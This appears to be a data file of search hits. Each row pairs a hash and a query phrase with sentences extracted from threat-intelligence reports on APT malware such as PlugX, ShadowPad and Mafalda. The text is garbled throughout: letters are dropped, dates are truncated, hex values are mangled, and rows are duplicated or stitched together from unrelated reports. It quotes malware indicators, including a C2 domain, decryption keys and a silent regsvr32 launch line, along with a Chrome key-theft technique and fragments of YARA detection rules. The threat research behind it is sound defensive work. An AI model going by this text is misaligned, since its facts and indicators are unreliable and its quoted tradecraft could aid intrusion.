d832c25b98e9a2dcd59fd5458f0993d3,a RAR archive,0.7618085146159383,"['Thursday, September 8, 202 By: Counter Threat Unit Research Team In June and July 202, Secureworks Counter Threat Unit (CTU) researchers identified a PlugX malware campaign targeting computers belonging to government oficials of several countries in Europe, the Midle East, and South America.', 'PlugX is modular malware that contacts a comand and control (C2) server for tasking and can download aditional plugins to enhance its capability beyond basic information gathering.', 'Several characteristics of this campaign indicate that it was conducted by the likely Chinese government-sponsored BRONZE PRESIDENT threat group, including the use of PlugX, file paths and naming schemes previously used by the threat group, the presence of shelcode in executable file headers, and politicaly-themed decoy documents that align with regions where China has interests.', 'The malware is embeded within RAR archive files.', 'Opening the archive on a Windows computer with default setings displays a Windows shortcut (LNK) file (se Figure 1) that masquerades as a document.', 'Figure 1.', 'Content of RAR archive file.', '(Source: Secureworks) Alongside the shortcut is a hiden folder that contains the malware, embeded eight levels dep in a sequence of hiden folders named with special characters (se Figure 2).', 'This tiering is likely to bypas mail-scaning products that may not traverse the entire path when scaning content, sugesting that the delivery mechanism was phishing emails, as there is no other benefit to creating such a folder structure.', '1/1 Figure 2.', 'Malicious files contained within hiden folder.']"
d6fb4bd8b1c522bf7ea8a41470e1b45f,a RAR archive,0.7618085146159383,"['Thursday, September 8, 202 By: Counter Threat Unit Research Team In June and July 202, Secureworks Counter Threat Unit (CTU) researchers identified a PlugX malware campaign targeting computers belonging to government oficials of several countries in Europe, the Midle East, and South America.', 'PlugX is modular malware that contacts a comand and control (C2) server for tasking and can download aditional plugins to enhance its capability beyond basic information gathering.', 'Several characteristics of this campaign indicate that it was conducted by the likely Chinese government-sponsored BRONZE PRESIDENT threat group, including the use of PlugX, file paths and naming schemes previously used by the threat group, the presence of shelcode in executable file headers, and politicaly-themed decoy documents that align with regions where China has interests.', 'The malware is embeded within RAR archive files.', 'Opening the archive on a Windows computer with default setings displays a Windows shortcut (LNK) file (se Figure 1) that masquerades as a document.', 'Figure 1.', 'Content of RAR archive file.', '(Source: Secureworks) Alongside the shortcut is a hiden folder that contains the malware, embeded eight levels dep in a sequence of hiden folders named with special characters (se Figure 2).', 'This tiering is likely to bypas mail-scaning products that may not traverse the entire path when scaning content, sugesting that the delivery mechanism was phishing emails, as there is no other benefit to creating such a folder structure.', 'htps:/w.secureworks.com/blog/bronze-president-targets-government-oficials 1/15 12/7/2, 9:27 AM BRONZE PRESIDENT Targets Government Oficials | Secureworks Figure 2.', 'Malicious files contained within hiden folder.']"
c89a6cfa1e6eb16768ede2ce52695f89,encrypted header,0.7733324702282083,"['purposes, and perhaps for this reason, the one year registrationwasnotrenewed by theatacker.', 'Despite BYTE SIZE (BYTES) DESCRIPTION* POSITION this, anumberof victims aroundtheworld continued 0 4 LURK protocol identifier.', 'to usethedomainto locatetheirC2 server, resulting Hexadecimalbytes 0x4C 0x50x52 in atempted comunications to a C2 server that no 0x4B (orLURKinASCI representation).', 'longerexists.', '4 1 Hexadecimalbyte0x30(0)inal observedsamples.Bytemayform THEVICTIMS partoftheprotocol identifier.', 'Computers using IP adreses alocated to France, 5 4 SizecCompresedmesagesizein bytes (includingheader).', 'thePeoplesRepublicof China, Portugal, SouthKorea, 9 4 Decompresed datasizeinbytes.', 'Taiwan, the United Kingdom and the United States 13 2 ZLIB6streamheader.Hexadecimal areamong thosethat atempted to comunicatewith bytes 0x780x9c7inalobserved alyac.org subdomains after the atackers comunications,denoting thathe DEFLATEcompresionmethod was registrationlapsedinSeptember201.', 'used tocompresthedata(witha window sizeof32K).', 'While some of these computers belong to 15 [Sizec15] DEFLATEcompresed data.', 'security researchers who deliberately instaled *AL VALUES ARE LITLENDIAN UNLES OTHERWISE STATED.']"
8b1ec3103590201632c0768238d50bea,has been obfuscated with the same rel_jmp and fake-jb techniques,0.7750647704535484,"['After decryption, the file is deleted and the shelcode is re-encrypted, saved in the registry, and run.', 'When log.exe is launched subsequently, the shelcode wil be loaded from the registry.', 'The data is stored in a hive with a name resembling the folowing: (HKLM|HKCU)\\Software\\Clases\\CLSID\\{%8.8x-%4.4x-%4.4x- %8.8x%8.8x}, in key %8.8X.', 'The values inserted in the formating strings are generated based on the TimeDateStamp in the PE header of log.dl, and therefore are always identical for any given library copy.', 'In our case, they equal {56a36bd2-5e2b-20b0-96f2cb9b3f43475} and EB5D182, respectively.', 'The payload is ShadowPad shelcode that has ben obfuscated with the same rel_jmp and fake-jb techniques.', 'The folowing strings are contained in its encrypted configuration: 28/41 6/30/2020 1:25:52 PM c %ProgramData%\\ msdn.exe log.dl log.dl.dat WMNetworkSvc WMNetworkSvc WMNetworkSvc SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Run WMSVC %ProgramFiles%\\Windows Media Player\\wmplayer.exe %windir%\\system32\\svchost.exe %windir%\\system32\\winlogon.exe %windir%\\explorer.exe TCP:/cigy2jft92.kasprsky.info:43 UDP:/cigy2jft92.kasprsky.info:53 SOCKS4 SOCKS4 SOCKS5 SOCKS5 They include the likely data of module asembly (June 6, 2020), name of the service used by the malware to gain persistence on the system (WMNetworkSvc), names of proceses into which shelcode can be injected, and the C2 domain cigy2jft92.kasprsky[.]info.', 'As we wrote earlier, the other domain kasprsky[.', ']info has ben used by atackers as a FunySwitch C2 server.', 'Investigation of subdomains and IP adreses yields another second-level domain, livehost[.', ']live, whose subdomain d89o0gm35t.livehost[.']"
d796dbba3d5ae1f39981b59e9602fd58,RAR and SFX-RAR files,0.8295005384285455,[]
d5f48a36310fa03cda7ebcafbdb2f355,RAR and SFX-RAR files,0.8295005384285455,"['2.', '(Atack Scenario) 2.1.', '(Atack Flowchart) , CHM JSE C2 .', '[ 2-1] 2JSE Genians Security Center 3 Threat Inteligence Report 2.2.', '- (Initial Aces-Phishing) 2023 8 .', '.', ', .', '(C2) .', ', (Top-level domain, TLD) "".cam"" .', 'donotreply@sgibn.cam htps:/hones[.', ']fun/0e650c610b7e1075474575b /download [ 2-1] Genians Security Center 4 Threat Inteligence Report [ 2-2] Genians Security Center 5 Threat Inteligence Report 2.3.']"
fe7fa3f3addedc4b685a4ef87902f984,plus the folder,0.7903943838969361,"['CobInt/COLPANTS Phish & Infrastructure Analysis After inspecting the domain, rietumu[.', ']me, ASERT uncovered the email adres solisariana[@]protonmail[.]com.', 'Pivoting on the email leads to five aditional domains each with a creation date of: 2018-08-01.', '1.', 'compas[.', ']plus 2.', 'eucentalbank[.', ']com 3.', 'europecentalbank[.', ']com 4.', 'inter-kasa[.']"
fe7fa3f3addedc4b685a4ef87902f984,plus the folder,0.7903943838969361,"['CobInt/COLPANTS Phish & Infrastructure Analysis After inspecting the domain, rietumu[.', ']me, ASERT uncovered the email adres solisariana[@]protonmail[.]com.', 'Pivoting on the email leads to five aditional domains each with a creation date of: 2018-08-01.', '1.', 'compas[.', ']plus 2.', 'eucentalbank[.', ']com 3.', 'europecentalbank[.', ']com 4.', 'inter-kasa[.']"
475cc557a403e5a686bf4e9a5b16e3d2,"malicious archive,",0.8246317845184259,"['Services display sensitive content.', 'for your neds.', 'such as Archive.org and Archive.Today aim to preserve al websites, which can Ad the folowing to a robots.txt I am NAME owner of DOMAIN.', 'be an unwelcome feature for those who file on your site.', 'Im oficialy requesting the imediate removal of my site wish to erase their past.', 'Fortunately we (Create a new file if one is not from al archive.org products.', 'stil have some privacy powers which already present.)', 'The User-agent: archive.org_ can be executed to remove undesired bot Disalow: / code present content asociated with the domains User-agent: archive.org_bot in our robots.txt file is not which we own.', 'being honored.', 'It can be sen Disalow: / at: Archive.org Removal Create a file caled verify.txt at the htps:/DOMAIN/robots.txt If your website(s) apear on Archive.', 'rot of your site.']"
9e98257b06b69c47a1e84ff668656b28,the folder C:\Users\Public,0.7570171163279376,"['Below are YARA rules to identify the SiestaGraph malware implant and the DorMe IS backdor.', 'rule Windows_Trojan_DorMe { meta: author = ""Elastic Security"" creation_date = ""202-12-09"" last_modified = ""202-12-15"" os = ""Windows"" arch = ""x86"" category_type = ""Trojan"" family = ""DorMe"" threat_name = ""Windows.Trojan.DorMe"" reference_sample = ""96b26e1dcfb8ea215c2fa508125472c8c767569d09a81ab4c39453e4fe7f"" strings: $seq_aes_crypto = { 8B 6C 24 ?', 'C1 E5 ?', '8B 5C 24 ?', '8D 34 9D ?', '?', '?', '?', '0F B6 04 31 32 4 24 ?', '8 04 29 8D 04 9D ?', '?']"
c4c46eae7d246851b784ff31be2d6600,folder c:\programdata,0.7797396339725909,"['They then receive aditional files from the C2 and perform malicious acts.', 'Figure.', 'Backdor operation proces Other Forms of Data Hiding The Lazarus group either used a system folder as a hiding place or imitated the name of a normal file to hide their malware.', 'The default system folders are where their malware hiding is mainly done.', 'The malware is hiden by either creating a similar folder within the system or by disguising the malware as a normal file within a system file thats hiden by default.', 'C:\\ProgramData\\ C:\\ProgramData\\Microsoft\\ C:\\Windows\\System32\\ 2/9 The C:\\ProgramData folder is a default system folder which is hiden by default.', 'A folder with a name similar to the default folder (MicrosoftPackages) is created inside this folder as a malware hiding place or the malware is disguised as a similar file inside the default folder.', 'Figure.', 'Similar folder created to use as a malware hiding place Figure.', 'Hiding malware by imitating default folder names Artifact Wiping Artifact wiping refers to the task of permanently deleting specific files or the whole file system.', 'Not only does it involve file deletion, but expert tols can also be used to erase al traces of use.']"
ac0df47c7a7c71929ea786a25a27fdd7,decryption,0.8539491256374303,"['This indicates that the Mafalda implant is a maintained, ongoing project.', 'The figures below depict the functions in the older and the newer Mafalda variant that handle the procesing of the diferent backdor comands based on the comand number.', 'Fig 8: Older Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 13 Fig 9: Newer Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 14 1 htps:/atack.mitre.org/software/S073/ The ful unobfuscated list of comands, along with the developers descriptions, are available in the Mafalda section of the Technical Apendix.', 'The folowing functionality is only available in the newer Mafalda variant: Network and system configuration reconaisance.', 'Information theft and implant orchestration.', 'Data decryption.', 'Filesystem operations.', 'The folowing is a sumary of some of the newer Mafalda comands: Comand 60 Reads the content of the file %USERPROFILE%\\ApData\\Local\\Gogle\\Chrome\\User Data\\Local State and sends the file content to the C2 server as part of a packet with a name prefixed with lot\\.', 'The Local State file stores security-relevant data, such as an encryption key that Chrome uses to protect cokies.', 'The environment variable %USERPROFILE% expands to the path to the profile folder of the user in whose context Mafalda runs, such as C:\\Users\\test for the user test.', 'Comand 61 Decrypts atacker-provided data using the DPAPI (Data Protection Aplication Programing Interface) key of the platform where Mafalda runs.']"
ac0df47c7a7c71929ea786a25a27fdd7,decryption,0.8539491256374303,"['This indicates that the Mafalda implant is a maintained, ongoing project.', 'The figures below depict the functions in the older and the newer Mafalda variant that handle the procesing of the diferent backdor comands based on the comand number.', 'Fig 8: Older Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 13 Fig 9: Newer Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 14 1 htps:/atack.mitre.org/software/S073/ The ful unobfuscated list of comands, along with the developers descriptions, are available in the Mafalda section of the Technical Apendix.', 'The folowing functionality is only available in the newer Mafalda variant: Network and system configuration reconaisance.', 'Information theft and implant orchestration.', 'Data decryption.', 'Filesystem operations.', 'The folowing is a sumary of some of the newer Mafalda comands: Comand 60 Reads the content of the file %USERPROFILE%\\ApData\\Local\\Gogle\\Chrome\\User Data\\Local State and sends the file content to the C2 server as part of a packet with a name prefixed with lot\\.', 'The Local State file stores security-relevant data, such as an encryption key that Chrome uses to protect cokies.', 'The environment variable %USERPROFILE% expands to the path to the profile folder of the user in whose context Mafalda runs, such as C:\\Users\\test for the user test.', 'Comand 61 Decrypts atacker-provided data using the DPAPI (Data Protection Aplication Programing Interface) key of the platform where Mafalda runs.']"
41d6e1e379006c93e59f114b3161977e,decryption,0.8016585728073772,"['Payload .VBS file Analysis The folowing screnshot shows a part of the .VBS payload file droped by .RTF file.', 'First line is the encrypted .dl 4th line contains Key to decrypt the .dl.', 'Remaining part is self-explanatory.', 'The instruction c = Crypt(c,k) function decrypts the encrypted dl and returns the decrypted dl.', '(Se the screnshot above) c= encrypted dl.', 'k = decryption key.', 'Folowing function writes byte by byte to the droped.dl file.', 'Finaly, the folowing code executes the regsvr32 comand to run the wmiprvse.dl in silent mode and sets the run key in registry.', 'Payload wmiprvse.dl file Analysis This first level of deobfuscation in wmiprvse.dl takes around 3-4 minutes to finish.', 'Then it alocates memory using VirtualAloc and writes the unpacked code to newly alocated memory before it jumps to the unpacked code as shown in folowing scren shot.', 'This dl has 3 layers of unpacking.']"
41d6e1e379006c93e59f114b3161977e,decryption,0.8016585728073772,"['Payload .VBS file Analysis The folowing screnshot shows a part of the .VBS payload file droped by .RTF file.', 'First line is the encrypted .dl 4th line contains Key to decrypt the .dl.', 'Remaining part is self-explanatory.', 'The instruction c = Crypt(c,k) function decrypts the encrypted dl and returns the decrypted dl.', '(Se the screnshot above) c= encrypted dl.', 'k = decryption key.', 'Folowing function writes byte by byte to the droped.dl file.', 'Finaly, the folowing code executes the regsvr32 comand to run the wmiprvse.dl in silent mode and sets the run key in registry.', 'Payload wmiprvse.dl file Analysis This first level of deobfuscation in wmiprvse.dl takes around 3-4 minutes to finish.', 'Then it alocates memory using VirtualAloc and writes the unpacked code to newly alocated memory before it jumps to the unpacked code as shown in folowing scren shot.', 'This dl has 3 layers of unpacking.']"
c53da9ec05d78bde1eab4d813ea4924f,decryption,0.780670919688295,"['{ 3. meta: 4.', '5. description = ""Detects obfuscation paterns used in HALFRIG.', 'This rule wasn\'t tested against large dataset, it should be used for threat hunting and not on services like VTI.""', '6.', '7. strings: 8.', '/ Decryption constants and decryption operation 9.', '$ = {48 B 0B 91 09 19 4D FD 9B F3 } 10.', '1.', '$ = {4D 8D 40 01 48 8B CA 48 8B C2 48 C1 E9 38 48 83 C9 01 48 C1 E0 08 48 8B D1 48 3 D0} 12.', '13.', '$ = {C7 05 [3] 0 F7 91 4D 01 } 14.']"
9f37e71695d9bbc0a254d54d1edbdb58,decryption,0.7633052540464057,"['Hashes of the analyzed samples .', '6 2.', 'Similarities and diferences .', '7 2.1.', 'General details .', '7 2.2.', 'String decryption .', '9 2.3. AES encryption of the configuration file .', '14 2.4.', 'Format of the (encrypted) configuration file .', '24 2.5.']"
9f37e71695d9bbc0a254d54d1edbdb58,decryption,0.7633052540464057,"['Hashes of the analyzed samples .', '6 2.', 'Similarities and diferences .', '7 2.1.', 'General details .', '7 2.2.', 'String decryption .', '9 2.3. AES encryption of the configuration file .', '14 2.4.', 'Format of the (encrypted) configuration file .', '24 2.5.']"
b5d067b705e3d7716dc5cd360e61cc7d,decrypt,1.0,"['The execution of StealthMutant through InstalUtil.exe InstalUtil.exe is a legitimate instaler aplication under Microsofts .NET Framework, but it is also known as a living-of-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstalUtil.exe is registered to run StealthMutant, as demonstrated in Figure 1.', 'Figure 1.', 'InstalUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Technical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shelcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shelcode loader writen in C# that has ben in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote proces, and then executes it.', 'We have observed that its payload has ben either the Cobalt Strike beacon or the ScrambleCros backdor.', 'Most of the StealthMutant samples we have come acros are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework aplications.', 'After deobfuscating these samples, we have observed raw namespaces and clases that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and clases from the deobfuscated samples 1 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Al the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
54739c05e5c102ca2f434bf7436f19fa,proxy,0.7810083562863923,"['Securelist.', 'August 2015. can even be such a thing.', 'In a hypothetical scenario where we htps:/securelist.com/blog/research/71713/darkhotels- have packets captured en route (as in the comon jab PCAP or atacks-in-2015/.', 'GTFO), could it not be a backdored system being used to [2] Schneier, B.', 'Simultaneous Discovery of Vulnerabilities.', 'proxy through?', 'Where we catch a nation-state operator Schneier on Security.', 'February 2016. red-handed, would we not ned an understanding of the htps:/w.schneier.com/blog/archives/2016/02/ provenance of their tasking?', 'More realisticaly, there wil never simultaneous_di.html.', 'be a solid enough atribution claim for everyone to get behind.', 'Rather, the combination of multiple indicators helps an analyst [3] Equation Group: Questions and Answers.']"
54739c05e5c102ca2f434bf7436f19fa,proxy,0.7810083562863923,"['Securelist.', 'August 2015. can even be such a thing.', 'In a hypothetical scenario where we htps:/securelist.com/blog/research/71713/darkhotels- have packets captured en route (as in the comon jab PCAP or atacks-in-2015/.', 'GTFO), could it not be a backdored system being used to [2] Schneier, B.', 'Simultaneous Discovery of Vulnerabilities.', 'proxy through?', 'Where we catch a nation-state operator Schneier on Security.', 'February 2016. red-handed, would we not ned an understanding of the htps:/w.schneier.com/blog/archives/2016/02/ provenance of their tasking?', 'More realisticaly, there wil never simultaneous_di.html.', 'be a solid enough atribution claim for everyone to get behind.', 'Rather, the combination of multiple indicators helps an analyst [3] Equation Group: Questions and Answers.']"
937553fb8e3ba631cb28165aa71a66da,proxy,0.7569189103367252,"['File might have random apended data (Depends on the configs 0x92 flag at ofset 0x326).', '0xA0 Loaders filepath Table 2 Shadowpad Data Types 3/12 Once one of the above bytes are located, ShadowPad reads the data (size is defined before the byte identifier) and apends the last DWORD value to the hardcoded byte aray 1A915B2D21384C6DA3C21FCA5201A4.', 'Then it hashes (MD5) the constructed byte aray and derives an AES-CBC 128bits key and decrypts the data.', 'In adition, ShadowPad stores, in an encrypted format, the folowing data in the registry with the registry key name being unique (based on volume serial number of C:\\) for each compromised host: 1.', 'ShadowPad configuration (0x80) data.', '2.', 'Proxy configuration.', 'Includes proxy information that ShadowPad requires.', 'These are the network comunication protocol, domain/IP proxy and the proxy port.', '3.', 'Downloaded modules.']"
9cd7c673b04415e320b2ceea1c818934,proxy,0.7691225825819927,"['Wel-trained and ready users, informed with the latest threat inteligence on adversary activity, are the first line of defense.', '3.', 'End User Device Security.', 'Adaptable endpoint security is critical to stoping this type of atack early, especialy for users working from home and not behind the enterprise web proxy or other layered defensive capability.', 'Stoping or detecting the first two stages of infection requires an endpoint security capability of identifying file-les malware, particularly malicious Ofice documents and persistence techniques that leverage start-up folder modification.', '4.', 'Web Proxy.', 'A secure web gateway is an esential part of enterprise security architecture and, in this scenario, can restrict aces to malicious web sites and block aces to the comand and control sites.', '5.', 'Sec Ops Endpoint Detection and Response (EDR) can be used to detect techniques most likely in stages 1, 2 or 4.', 'Aditionaly, EDR can be used to search for the initial documents and other indicators provided through threat analysis.']"
9cd7c673b04415e320b2ceea1c818934,proxy,0.7691225825819927,"['Wel-trained and ready users, informed with the latest threat inteligence on adversary activity, are the first line of defense.', '3.', 'End User Device Security.', 'Adaptable endpoint security is critical to stoping this type of atack early, especialy for users working from home and not behind the enterprise web proxy or other layered defensive capability.', 'Stoping or detecting the first two stages of infection requires an endpoint security capability of identifying file-les malware, particularly malicious Ofice documents and persistence techniques that leverage start-up folder modification.', '4.', 'Web Proxy.', 'A secure web gateway is an esential part of enterprise security architecture and, in this scenario, can restrict aces to malicious web sites and block aces to the comand and control sites.', '5.', 'Sec Ops Endpoint Detection and Response (EDR) can be used to detect techniques most likely in stages 1, 2 or 4.', 'Aditionaly, EDR can be used to search for the initial documents and other indicators provided through threat analysis.']"
88d674726f92a0b205d41f6b44c23d24,Computer name,0.9939697234121188,[]
88d674726f92a0b205d41f6b44c23d24,Computer name,0.9939697234121188,[]
272d3c74c836029cd04557377079991e,Computer name,0.7631110073603482,"['probable targets.', 'becomes part of a unique ""browser fingerprint"" that can identify the users computer moving forward.', '4 SPECIAL REPORT Pinpointing Targets: Exploiting Web Analytics to Ensnare Victims THE OPERATION B egining last year, we identified cyber When an unsuspecting user visits any of the actors integrating fre, publicly available over 10 compromised websites, a smal piece The folowing are tols with custom scripts to monitor the of inserted codembeded in the sites HTML examples of some of the online activities of Internet users without their and invisible to casual visitorsquietly redirects web tols embeded knowledge,2 just as corporations track the online the users browser to a second compromised in the WITCHCOVEN activity of web users around the world.', 'We website without the users knowledge.', 'This code and the data they colect: believe these cyber threat actors are building second website hosts the WITCHCOVEN profiles of potential victims and learning about script,4 which uses profiling techniques to colect the vulnerabilities in users computers.', 'These very technical information on the users computer.', 'same technologies that marketing firms use to As of early November 2015, we identified a track their clients and ensure their websites work total of 14 websites hosting the WITCHCOVEN on diferent types of web browsers can help cyber profiling script.', 'The detect Ofice threat actors beter identify their victims and module from the tailor future infection atempts.', 'Browser Exploitation We believe these cyber threat Framework,5 an open The cyber threat actors start by compromising source penetration actors are building profiles of large numbers of legitimate websites.', 'The testing tol, determines potential victims and learning websites are not randomly chosen targets of the Microsoft Ofice oportunity, but specificaly selected as part of about the vulnerabilities in version on a computer a tactic caled a strategic web compromise.3 The users computers.', 'by testing the browsers atackers then modify the underlying HTML response to various ActiveX objects.']"
272d3c74c836029cd04557377079991e,Computer name,0.7631110073603482,"['probable targets.', 'becomes part of a unique ""browser fingerprint"" that can identify the users computer moving forward.', '4 SPECIAL REPORT Pinpointing Targets: Exploiting Web Analytics to Ensnare Victims THE OPERATION B egining last year, we identified cyber When an unsuspecting user visits any of the actors integrating fre, publicly available over 10 compromised websites, a smal piece The folowing are tols with custom scripts to monitor the of inserted codembeded in the sites HTML examples of some of the online activities of Internet users without their and invisible to casual visitorsquietly redirects web tols embeded knowledge,2 just as corporations track the online the users browser to a second compromised in the WITCHCOVEN activity of web users around the world.', 'We website without the users knowledge.', 'This code and the data they colect: believe these cyber threat actors are building second website hosts the WITCHCOVEN profiles of potential victims and learning about script,4 which uses profiling techniques to colect the vulnerabilities in users computers.', 'These very technical information on the users computer.', 'same technologies that marketing firms use to As of early November 2015, we identified a track their clients and ensure their websites work total of 14 websites hosting the WITCHCOVEN on diferent types of web browsers can help cyber profiling script.', 'The detect Ofice threat actors beter identify their victims and module from the tailor future infection atempts.', 'Browser Exploitation We believe these cyber threat Framework,5 an open The cyber threat actors start by compromising source penetration actors are building profiles of large numbers of legitimate websites.', 'The testing tol, determines potential victims and learning websites are not randomly chosen targets of the Microsoft Ofice oportunity, but specificaly selected as part of about the vulnerabilities in version on a computer a tactic caled a strategic web compromise.3 The users computers.', 'by testing the browsers atackers then modify the underlying HTML response to various ActiveX objects.']"
c89a6cfa1e6eb16768ede2ce52695f89,Computer name,0.7631110073603482,"['versions of the RAT including the ability to start a 204 52 Unknown.', 'comand shel, control proceses and services, 256 32 Nulterminated computername(if upload/download files, terminate TCP conections, sucesfulyobtainedfromthesystem).', 'createuseracounts, retrievesystem information, log 28 12 Procesname.', 'useractivity(viakeyloger), modifytimestamps on 30 52 0x0 bytes inalobserved files, conduct proces injection, conduct denial of comunications.', 'service atacks and shutdown or restart the 352 36 SYSTEM_INFO16structure(format showninAnexB).', 'computer.', 'Comands suported by the XShel softwarearelisted inAnexC.', '(XTiger) 38 72 0x0 bytes inalobserved samples.', '460 12 Unknown.', '472 4 Localeidentifier17.', '18Theproces svchost.exe isagenerichostprocesforservices 476 4 Tick count(repeated).']"
7c7b25b6a53baebfa2ab0f310bd10b17,Network-level protocol,0.927469471882242,"['This type of DoS is famous for its two stages of infecting hosts and creating botnet of zombies who pretend to be a wel defended endpoint and the atack phase that has ben sen to take from minutes to over multiple days.', 'The vector varies from network type atacks to aplication layer atacks235.', 'Encrypted Atacks.', 'The rise of using encrypted services and trafic (SL) on the web has atracted diferent levels of DoS atacks.', 'This includes atacks on the aplication level (flod atacks, bruteforce etc.', '), network level and the protocol level (i.e.', 'SL renegotiation or downgrade) making it harder for defenders and tolsets to recognise malicious trafic from legitimate236.', '3.5.5 Specific atack vectors Acording to Nexusgaurd Q2 2018 report, most of the atacks were focused on hit-run tactics and specificaly during peak times to strike their targets with UDP, TCP (SYN) and ICMP flods being the top 3 vectors.', 'The duration of these malicious atempts were mostly recorded as lasting les than 90 minutes and the longest to more than 6 days.', '234htps:/w.ipexpoeurope.com/content/download/13783/181390/file/NETSCOUT_ThreatReport_FINAL_080618 b.pdf, acesed November 2018.', '235 htps:/w.hindawi.com/journals/scn/2018/5353060/, acesed November 2018.']"
d0be355baf56cd83998a7c09fa619fd9,AES-128 is the encryption algorithm used.,0.7664629893627091,"[""MISCREANT'S DROPER The droper operates straight forward; it fetches the encrypted DL from its own binary from outside its resource section, decrypts it and hides it in the file system."", 'Then it goes on to load the DL using Windows regsvr32.exe.', 'To achieve this it spawns a dedicated proces with the comand line \'""regsvr32.exe"" /s /n /i ""%APDATA%\\%DLNAME%""\'.', 'The DL name is random but legitimately loking and hardcoded for a specific droper.', ""It is also stored as encrypted string in the binary, and has ben sen to decrypt to either 'perf585.dl' or 'dump21cb.dl' depending on the droper."", 'The encryption algorithm used is AES (Advanced Encryption Standard) with 128-bit keys.', ""The keys used for decryption are '20 3 AF 73 A9 AC 72 D3 BE E6 A5 73 92 BA 37 6C' for the implant filename and 'A0 0E 3E B3 3A 1C D3 A A0 BE 3F B3 F9 0A 96 15' for decrypting the binary."", ""AES is the encryption algorithm of choice throughout the droper and its implant's operations."", 'Interestingly, the Babar droper as wel as the implant show a similar method of API name obfuscation as the Buny malware and samples from the NBOT family.', 'Dedicated APIs are loaded through a resolution function, which searches for library exports by comparing hashes of the export names with a given hash.', 'For the Babar project though the atackers used an adapted version of SHA-1, as oposed to the simple XOR/ROL hash algorithm which was used in the Buny project.']"
d0be355baf56cd83998a7c09fa619fd9,AES-128 is the encryption algorithm used.,0.7664629893627091,"[""MISCREANT'S DROPER The droper operates straight forward; it fetches the encrypted DL from its own binary from outside its resource section, decrypts it and hides it in the file system."", 'Then it goes on to load the DL using Windows regsvr32.exe.', 'To achieve this it spawns a dedicated proces with the comand line \'""regsvr32.exe"" /s /n /i ""%APDATA%\\%DLNAME%""\'.', 'The DL name is random but legitimately loking and hardcoded for a specific droper.', ""It is also stored as encrypted string in the binary, and has ben sen to decrypt to either 'perf585.dl' or 'dump21cb.dl' depending on the droper."", 'The encryption algorithm used is AES (Advanced Encryption Standard) with 128-bit keys.', ""The keys used for decryption are '20 3 AF 73 A9 AC 72 D3 BE E6 A5 73 92 BA 37 6C' for the implant filename and 'A0 0E 3E B3 3A 1C D3 A A0 BE 3F B3 F9 0A 96 15' for decrypting the binary."", ""AES is the encryption algorithm of choice throughout the droper and its implant's operations."", 'Interestingly, the Babar droper as wel as the implant show a similar method of API name obfuscation as the Buny malware and samples from the NBOT family.', 'Dedicated APIs are loaded through a resolution function, which searches for library exports by comparing hashes of the export names with a given hash.', 'For the Babar project though the atackers used an adapted version of SHA-1, as oposed to the simple XOR/ROL hash algorithm which was used in the Buny project.']"
8b1ec3103590201632c0768238d50bea,AES-128 is the encryption algorithm used.,1.0000000000000002,"['For the client these always equal 17 03 01; for the server, they have random values.', 'Data length, not including header (2 bytes) Mesage contents: Comand ID (4 bytes, litle-endian) Comand data size (4 bytes, litle-endian) Client ID (36 bytes), generated based on the UID when the backdor starts operation Comand data The first two clientserver and serverclient mesages have comand IDs 0x65 and 0x64, respectively.', 'They contain the data that wil then be used to generate the client and server sesion keys.', 'The key generation algorithm is detailed in a Zscaler report.', 'For al subsequent mesages, the content (not including the FakeTLS header) is transfered in the coresponding encrypted sesion key.', 'AES-128 is the encryption algorithm used.', 'The transport-level protocol depends on the conection type indicated in the configuration.', 'Four protocols are suported: 1.', 'Standard TCP conection Aplication-level mesages are sent unchanged as TCP segments.', '6/41 2.', 'Equivalent to HTP Long Poling The client creates two TCP conections.']"
19c90678c8b66114c16c983c980d62f3,encrypted with AES-256-CBC;,0.9288888278347719,"['Basicaly, its a payload loader.', 'The whole code is obfuscated with diferent Windows API cals and lops.', 'It wasnt designed to confuse a reverse enginer or to make reverse enginering harder, but to bypas some simple AV emulation engines.', 'The first exported function for every COM object is DlGetClasObject.', 'DlGetClasObject The loader creates a thread that decrypts the payload, restores its PE and MZ headers, and then loads it into memory and launches it.', 'The payload is encrypted with AES 256 CBC.', 'The decryption key is hardcoded along with other encrypted strings.', 'It doesnt contain MZ and PE tags that alow it to bypas simple AV engines.', 'After initializing the payload, the loader cals its function with ordinal 1. nav_downarow.png The payload, with backdor functionality, is a DL file.', 'The malware functionality is in the first exported entry only.', 'nav_downarow.png Ordinal 1 (Trojan-backdor main function) The first thing that it does is decrypt the other encrypted binary (containing configuration data) from the SFX content: The configuration itself is divided into blocks, and every block has its own index.']"
